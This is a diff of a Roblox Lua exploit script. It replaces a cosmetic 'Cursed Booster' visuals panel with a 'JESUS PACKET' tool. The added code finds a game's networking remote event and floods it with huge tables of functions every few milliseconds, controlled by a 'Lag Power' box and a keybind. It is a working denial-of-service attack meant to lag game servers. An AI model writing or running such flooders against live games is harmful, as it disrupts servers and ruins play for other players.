@@ -1,321 +1,197 @@
--- [[ DEOBFUSCATED BY SOURCES HUB OWNER ]] --
+-- JESUS PACKET (compact)
+repeat task.wait() until game:GetService("Players").LocalPlayer
+local P = game:GetService("Players")
+local UIS = game:GetService("UserInputService")
+local RS = game:GetService("ReplicatedStorage")
+local lp = P.LocalPlayer
+local pg = lp:FindFirstChild("PlayerGui") or lp:WaitForChild("PlayerGui", 10)
+print("[JESUS] 1 start")
 
--- // [1] SERVICES //
-local Players = game:GetService("Players")
-local Workspace = game:GetService("Workspace")
-local Lighting = game:GetService("Lighting")
-local RunService = game:GetService("RunService")
-local CoreGui = game:GetService("CoreGui")
-local UserInputService = game:GetService("UserInputService")
-
-local LocalPlayer = Players.LocalPlayer
-
--- // [2] CONFIGURATION (EDIT EVERYTHING HERE) //
-local CONFIG = {
-    Names = {
-        ScreenGui = "CursedBoosterGui",
-        WatermarkGui = "CursedWatermark",
-        MainFrame = "MainFrame",
-        TopBar = "TopBar",
-        Avatar = "Avatar",
-        UsernameLabel = "UsernameLabel",
-        UserIdLabel = "UserIdLabel",
-        TitleLabel = "TitleLabel",
-        DiscordLabel = "DiscordLabel",
-        ButtonContainer = "ButtonContainer"
-    },
-
-    Size = {
-        MainFrame = UDim2.new(0, 230, 0, 490),
-        TopBar = UDim2.new(0.9, 0, 0, 60),
-        Avatar = UDim2.new(0, 45, 0, 45),
-        Button = UDim2.new(0.85, 0, 0, 35)
-    },
-
-    Position = {
-        MainFrame = UDim2.new(0.8, 0, 0.5, -245),
-        TopBar = UDim2.new(0.05, 0, 0, 10),
-        Avatar = UDim2.new(0, 7, 0.5, -22),
-        Username = UDim2.new(0, 55, 0.1, 0),
-        UserId = UDim2.new(0, 55, 0.5, 0),
-        Title = UDim2.new(0, 0, 0, 75),
-        Discord = UDim2.new(0, 0, 0, 116)
-    },
-
-    Colors = {
-        MainFrame = Color3.fromRGB(20, 20, 20),
-        TopBar = Color3.fromRGB(30, 30, 30),
-        AvatarBG = Color3.fromRGB(40, 40, 40),
-        TextPrimary = Color3.fromRGB(255, 255, 255),
-        TextSecondary = Color3.fromRGB(150, 150, 150),
-        Accent = Color3.fromRGB(180, 0, 0),
-        ButtonDefault = Color3.fromRGB(35, 35, 35),
-        ButtonSave = Color3.fromRGB(50, 10, 10),     -- Little dark red for SAVE button
-        TextNormal = Color3.fromRGB(220, 220, 220),
-        TextToggled = Color3.fromRGB(180, 0, 0)       -- Red text when active / clicked
-    },
-
-    ButtonTexts = {
-        "STRETCH REZ",
-        "NIGHT TIME",
-        "PURPLE SKY",
-        "FPS BOOSTER",
-        "ANTI-LAG (CLEAN)",
-        "SAVE CONFIG"
-    },
-
-    FPSUpdateInterval = 0.5
-}
-
--- // [3] OBJECT REFERENCES //
-local ScreenGui, WatermarkGui, WatermarkLabel
-local MainFrame, TopBar, AvatarImage, UsernameLabel, UserIdLabel, TitleLabel, DiscordLabel
-local ButtonContainer
-local Buttons = {}
-local ButtonStates = {}
-
-local CurrentFPS = 60
-local LastFPSUpdate = 0
-
--- // [4] UTILITY FUNCTIONS //
-local function createInstance(className, properties)
-    local inst = Instance.new(className)
-    for k, v in pairs(properties or {}) do inst[k] = v end
-    return inst
+for _, v in pairs(pg:GetChildren()) do
+    if v.Name == "JESUSPACKET" then v:Destroy() end
 end
 
-local function applyUICorner(parent, radius)
-    local c = Instance.new("UICorner")
-    c.CornerRadius = UDim.new(0, radius or 12)
-    c.Parent = parent
-end
+local gui = Instance.new("ScreenGui")
+gui.Name = "JESUSPACKET"
+gui.ResetOnSpawn = false
+gui.DisplayOrder = 999
+gui.Parent = pg
+print("[JESUS] 2 gui")
 
-local function applyUIStroke(parent)
-    local s = Instance.new("UIStroke")
-    s.Color = CONFIG.Colors.Accent
-    s.Thickness = 2.5
-    s.Parent = parent
-end
+local key = "G"
+local intensity = 10000
+local active = false
+local listening = false
 
-local function updateButtonVisual(button, isToggled)
-    button.TextColor3 = isToggled and CONFIG.Colors.TextToggled or CONFIG.Colors.TextNormal
-end
+local card = Instance.new("Frame")
+card.Size = UDim2.fromOffset(260, 230)
+card.Position = UDim2.fromScale(0.5, 0.5)
+card.AnchorPoint = Vector2.new(0.5, 0.5)
+card.BackgroundColor3 = Color3.fromRGB(10, 12, 16)
+card.BackgroundTransparency = 0.15
+card.BorderSizePixel = 0
+card.ClipsDescendants = true
+card.Parent = gui
+Instance.new("UICorner", card).CornerRadius = UDim.new(0, 12)
 
-local function updateFPS()
-    local now = tick()
-    if now - LastFPSUpdate >= CONFIG.FPSUpdateInterval then
-        CurrentFPS = math.floor(1 / RunService.Heartbeat:Wait())
-        if WatermarkLabel then
-            WatermarkLabel.Text = string.format("CURSED BOOSTER | %s | FPS: %d", LocalPlayer.Name, CurrentFPS)
-        end
-        LastFPSUpdate = now
-    end
-end
+local title = Instance.new("TextLabel")
+title.BackgroundTransparency = 1
+title.Size = UDim2.new(1, -20, 0, 38)
+title.Position = UDim2.fromOffset(16, 0)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 14
+title.TextColor3 = Color3.fromRGB(240, 245, 255)
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.RichText = true
+title.Text = '<font color="#00aaff">JESUS</font> PACKET'
+title.Parent = card
 
-local function makeDraggable(frame)
-    local dragging, dragInput, dragStart, startPos
-    frame.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = input.Position
-            startPos = frame.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then dragging = false end
-            end)
-        end
-    end)
-    frame.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-            dragInput = input
-        end
-    end)
-    UserInputService.InputChanged:Connect(function(input)
-        if input == dragInput and dragging then
-            local delta = input.Position - dragStart
-            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+local btn = Instance.new("TextButton")
+btn.Size = UDim2.new(1, -32, 0, 70)
+btn.Position = UDim2.fromOffset(16, 52)
+btn.BackgroundColor3 = Color3.fromRGB(18, 22, 30)
+btn.AutoButtonColor = false
+btn.Text = "START"
+btn.Font = Enum.Font.GothamBold
+btn.TextSize = 22
+btn.TextColor3 = Color3.fromRGB(240, 245, 255)
+btn.Parent = card
+Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 14)
+
+local lbl = Instance.new("TextLabel")
+lbl.BackgroundTransparency = 1
+lbl.Position = UDim2.fromOffset(18, 130)
+lbl.Size = UDim2.new(1, -36, 0, 22)
+lbl.Font = Enum.Font.Gotham
+lbl.TextSize = 12
+lbl.TextColor3 = Color3.fromRGB(160, 180, 200)
+lbl.TextXAlignment = Enum.TextXAlignment.Left
+lbl.Text = "Lag Power"
+lbl.Parent = card
+
+local intBox = Instance.new("TextBox")
+intBox.Position = UDim2.fromOffset(16, 154)
+intBox.Size = UDim2.new(1, -32, 0, 30)
+intBox.BackgroundColor3 = Color3.fromRGB(18, 22, 30)
+intBox.BorderSizePixel = 0
+intBox.Font = Enum.Font.GothamBold
+intBox.TextSize = 14
+intBox.TextColor3 = Color3.fromRGB(0, 170, 255)
+intBox.Text = tostring(intensity)
+intBox.ClearTextOnFocus = false
+intBox.Parent = card
+Instance.new("UICorner", intBox).CornerRadius = UDim.new(0, 7)
+
+local kLbl = Instance.new("TextLabel")
+kLbl.BackgroundTransparency = 1
+kLbl.Position = UDim2.fromOffset(18, 190)
+kLbl.Size = UDim2.new(0.5, 0, 0, 26)
+kLbl.Font = Enum.Font.Gotham
+kLbl.TextSize = 12
+kLbl.TextColor3 = Color3.fromRGB(160, 180, 200)
+kLbl.TextXAlignment = Enum.TextXAlignment.Left
+kLbl.Text = "Keybind"
+kLbl.Parent = card
+
+local cap = Instance.new("TextButton")
+cap.AnchorPoint = Vector2.new(1, 0)
+cap.Position = UDim2.new(1, -16, 0, 190)
+cap.Size = UDim2.fromOffset(60, 26)
+cap.BackgroundColor3 = Color3.fromRGB(18, 22, 30)
+cap.BorderSizePixel = 0
+cap.Font = Enum.Font.GothamBold
+cap.TextSize = 12
+cap.TextColor3 = Color3.fromRGB(255, 255, 255)
+cap.Text = key
+cap.Parent = card
+Instance.new("UICorner", cap).CornerRadius = UDim.new(0, 7)
+print("[JESUS] 3 card")
+
+local Event
+local pkgs = RS:FindFirstChild("Packages")
+if pkgs then
+    local net = pkgs:FindFirstChild("Net")
+    if net then Event = net:GetChildren()[6] end
+end
+print("[JESUS] 4 Event=" .. tostring(Event and Event.Name or "nil"))
+
+local lagging, lagThread = false, nil
+local function startLag()
+    if lagging or not Event then return end
+    lagging = true
+    local n = math.clamp(math.floor(tonumber(intBox.Text) or 10000), 1, 100000)
+    local payload = table.create(n, function() end)
+    lagThread = task.spawn(function()
+        while lagging do
+            for _ = 1, 3 do pcall(function() Event:FireServer(payload) end) end
+            task.wait(0.01)
         end
     end)
 end
-
-local function setupWatermark()
-    WatermarkGui = createInstance("ScreenGui", {Name = CONFIG.Names.WatermarkGui, ResetOnSpawn = false, Parent = CoreGui})
-    WatermarkLabel = createInstance("TextLabel", {
-        Size = UDim2.new(0, 250, 0, 25),
-        Position = UDim2.new(1, -260, 1, -35),
-        BackgroundTransparency = 1,
-        Text = string.format("CURSED BOOSTER | %s | FPS: 60", LocalPlayer.Name),
-        TextColor3 = CONFIG.Colors.Accent,
-        Font = Enum.Font.Code,
-        TextSize = 14,
-        TextXAlignment = Enum.TextXAlignment.Right,
-        Parent = WatermarkGui
-    })
+local function stopLag()
+    if not lagging then return end
+    lagging = false
+    if lagThread then pcall(task.cancel, lagThread); lagThread = nil end
 end
 
-local function createButton(text, isSaveButton)
-    local btn = createInstance("TextButton", {
-        Size = CONFIG.Size.Button,
-        BackgroundColor3 = isSaveButton and CONFIG.Colors.ButtonSave or CONFIG.Colors.ButtonDefault,
-        Text = text,
-        TextColor3 = CONFIG.Colors.TextNormal,
-        Font = Enum.Font.SourceSansBold,
-        TextSize = 14,
-        AutoButtonColor = false,
-        Parent = ButtonContainer
-    })
-    applyUICorner(btn, 8)
-    return btn
-end
-
--- // [5] GUI CREATION //
-local function createGUI()
-    ScreenGui = createInstance("ScreenGui", {Name = CONFIG.Names.ScreenGui, ResetOnSpawn = false, Parent = CoreGui})
-
-    MainFrame = createInstance("Frame", {
-        Name = CONFIG.Names.MainFrame,
-        Size = CONFIG.Size.MainFrame,
-        Position = CONFIG.Position.MainFrame,
-        BackgroundColor3 = CONFIG.Colors.MainFrame,
-        Active = true,
-        Parent = ScreenGui
-    })
-    applyUICorner(MainFrame, 12)
-    applyUIStroke(MainFrame)
-
-    TopBar = createInstance("Frame", {Name = CONFIG.Names.TopBar, Size = CONFIG.Size.TopBar, Position = CONFIG.Position.TopBar, BackgroundColor3 = CONFIG.Colors.TopBar, BackgroundTransparency = 0.5, Parent = MainFrame})
-    applyUICorner(TopBar, 12)
-
-    AvatarImage = createInstance("ImageLabel", {Name = CONFIG.Names.Avatar, Size = CONFIG.Size.Avatar, Position = CONFIG.Position.Avatar, BackgroundColor3 = CONFIG.Colors.AvatarBG, Image = "rbxthumb://type=AvatarHeadShot&id="..LocalPlayer.UserId.."&w=150&h=150", Parent = TopBar})
-    applyUICorner(AvatarImage, 999)
-
-    UsernameLabel = createInstance("TextLabel", {Name = CONFIG.Names.UsernameLabel, Size = UDim2.new(1, -60, 0.5, 0), Position = CONFIG.Position.Username, BackgroundTransparency = 1, Text = LocalPlayer.DisplayName, TextColor3 = CONFIG.Colors.TextPrimary, Font = Enum.Font.SourceSansBold, TextXAlignment = Enum.TextXAlignment.Left, Parent = TopBar})
-    UserIdLabel = createInstance("TextLabel", {Name = CONFIG.Names.UserIdLabel, Size = UDim2.new(1, 0, 0, 40), Position = CONFIG.Position.UserId, BackgroundTransparency = 1, Text = "@"..LocalPlayer.Name, TextColor3 = CONFIG.Colors.TextSecondary, Font = Enum.Font.SourceSans, TextSize = 12, TextXAlignment = Enum.TextXAlignment.Left, Parent = TopBar})
-    TitleLabel = createInstance("TextLabel", {Name = CONFIG.Names.TitleLabel, Size = UDim2.new(1, 0, 0, 18), Position = CONFIG.Position.Title, BackgroundTransparency = 1, Text = "CURSED BOOSTER", TextColor3 = CONFIG.Colors.TextPrimary, Font = Enum.Font.SourceSansBold, TextSize = 20, Parent = MainFrame})
-    DiscordLabel = createInstance("TextLabel", {Name = CONFIG.Names.DiscordLabel, Size = UDim2.new(1, 0, 0, 18), Position = CONFIG.Position.Discord, BackgroundTransparency = 1, Text = "discord.gg/cursedhub", TextColor3 = CONFIG.Colors.Accent, Font = Enum.Font.SourceSans, TextSize = 14, Parent = MainFrame})
-
-    ButtonContainer = createInstance("Frame", {Name = CONFIG.Names.ButtonContainer, Size = UDim2.new(1, 0, 1, -142), Position = UDim2.new(0, 0, 0, 140), BackgroundTransparency = 1, Parent = MainFrame})
-    local list = Instance.new("UIListLayout")
-    list.Padding = UDim.new(0, 6)
-    list.HorizontalAlignment = Enum.HorizontalAlignment.Center
-    list.Parent = ButtonContainer
-
-    for i, text in ipairs(CONFIG.ButtonTexts) do
-        local isSave = (i == 6)
-        local btn = createButton(text, isSave)
-        Buttons[i] = btn
-        ButtonStates[i] = false
-    end
-
-    makeDraggable(MainFrame)
-end
-
--- // [6] FUNCTIONALITY //
-local function setupButtons()
-    for i, button in ipairs(Buttons) do
-        button.MouseButton1Click:Connect(function()
-            if i == 6 then -- SAVE CONFIG
-                print("[CURSED BOOSTER] Config saved!")
-                
-                -- Make text red on click
-                button.TextColor3 = CONFIG.Colors.TextToggled
-                button.Text = "SAVED!"
-                
-                task.wait(1.5)
-                
-                -- Reset
-                button.Text = CONFIG.ButtonTexts[i]
-                button.TextColor3 = CONFIG.Colors.TextNormal
-                return
-            end
-
-            -- Toggle logic for other buttons
-            ButtonStates[i] = not ButtonStates[i]
-            updateButtonVisual(button, ButtonStates[i])
-
-            if i == 1 then -- STRETCH REZ
-                local cam = Workspace.CurrentCamera
-                if cam then cam.FieldOfView = ButtonStates[i] and 120 or 70 end
-
-            elseif i == 2 then -- NIGHT TIME
-                if ButtonStates[i] then
-                    Lighting.ClockTime = 0
-                    Lighting.Brightness = 0.2
-                    Lighting.Ambient = Color3.fromRGB(20, 20, 35)
-                else
-                    Lighting.ClockTime = 14
-                    Lighting.Brightness = 2
-                    Lighting.Ambient = Color3.fromRGB(0.5, 0.5, 0.5)
-                end
-
-            elseif i == 3 then -- PURPLE SKY
-                if ButtonStates[i] then
-                    Lighting.Ambient = Color3.fromRGB(60, 30, 90)
-                    Lighting.FogColor = Color3.fromRGB(80, 40, 120)
-                    local sky = Lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky")
-                    sky.SkyboxBk = "rbxassetid://1534951537"
-                    sky.SkyboxDn = "rbxassetid://1534951537"
-                    sky.SkyboxFt = "rbxassetid://1534951537"
-                    sky.SkyboxLf = "rbxassetid://1534951537"
-                    sky.SkyboxRt = "rbxassetid://1534951537"
-                    sky.SkyboxUp = "rbxassetid://1534951537"
-                    sky.StarCount = 8000
-                    sky.Parent = Lighting
-
-                    local cc = Lighting:FindFirstChildOfClass("ColorCorrectionEffect") or Instance.new("ColorCorrectionEffect")
-                    cc.TintColor = Color3.fromRGB(180, 140, 255)
-                    cc.Saturation = 0.6
-                    cc.Contrast = 0.15
-                    cc.Parent = Lighting
-                else
-                    Lighting.Ambient = Color3.fromRGB(0.5, 0.5, 0.5)
-                    Lighting.FogColor = Color3.fromRGB(0.75, 0.75, 0.75)
-                end
-
-            elseif i == 4 then -- FPS BOOSTER
-                if ButtonStates[i] then
-                    settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
-                    Lighting.GlobalShadows = false
-                    Lighting.Brightness = 3
-                    Lighting.FogEnd = 9000000000
-                    Lighting.Technology = Enum.Technology.Legacy
-                    Lighting.EnvironmentDiffuseScale = 0
-                    Lighting.EnvironmentSpecularScale = 0
-                else
-                    settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic
-                    Lighting.GlobalShadows = true
-                    Lighting.Brightness = 2
-                    Lighting.FogEnd = 100000
-                    Lighting.Technology = Enum.Technology.ShadowMap
-                end
-
-            elseif i == 5 then -- ANTI-LAG (CLEAN)
-                if ButtonStates[i] then
-                    for _, obj in ipairs(Workspace:GetDescendants()) do
-                        if obj:IsA("ParticleEmitter") or obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("Beam") or obj:IsA("Fire") then
-                            obj:Destroy()
-                        end
-                    end
-                    print("[CURSED BOOSTER] ANTI-LAG cleanup finished")
-                    ButtonStates[i] = false
-                    updateButtonVisual(button, false)
-                end
-            end
-        end)
+local function toggle()
+    active = not active
+    if active then
+        btn.Text = "STOP"
+        btn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+        btn.TextColor3 = Color3.fromRGB(10, 12, 16)
+        startLag()
+    else
+        btn.Text = "START"
+        btn.BackgroundColor3 = Color3.fromRGB(18, 22, 30)
+        btn.TextColor3 = Color3.fromRGB(240, 245, 255)
+        stopLag()
     end
 end
+btn.MouseButton1Click:Connect(toggle)
 
-local function setupFPSCounter()
-    RunService.RenderStepped:Connect(updateFPS)
-end
+intBox.FocusLost:Connect(function()
+    local n = tonumber(intBox.Text)
+    if n then intensity = math.clamp(math.floor(n), 1, 100000) end
+    intBox.Text = tostring(intensity)
+end)
 
--- // [7] INITIALIZATION //
-local function init()
-    setupWatermark()
-    createGUI()
-    setupButtons()
-    setupFPSCounter()
+cap.MouseButton1Click:Connect(function()
+    listening = true
+    cap.Text = "..."
+end)
 
-    print("[CURSED BOOSTER] Loaded - SAVE CONFIG button is dark red. Click to flash red text + SAVED!")
-end
+UIS.InputBegan:Connect(function(input, gp)
+    if listening then
+        if input.UserInputType == Enum.UserInputType.Keyboard then
+            key = input.KeyCode.Name
+            cap.Text = key
+            listening = false
+        end
+        return
+    end
+    if gp then return end
+    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode.Name == key then
+        toggle()
+    end
+end)
 
-init()
+local dragging, startPos, startInput
+title.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging, startPos, startInput = true, card.Position, input.Position
+    end
+end)
+UIS.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local d = input.Position - startInput
+        card.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
+    end
+end)
+UIS.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
+
+print("[JESUS] LOADED — keybind=" .. key .. " | event=" .. tostring(Event and Event.Name or "nil"))
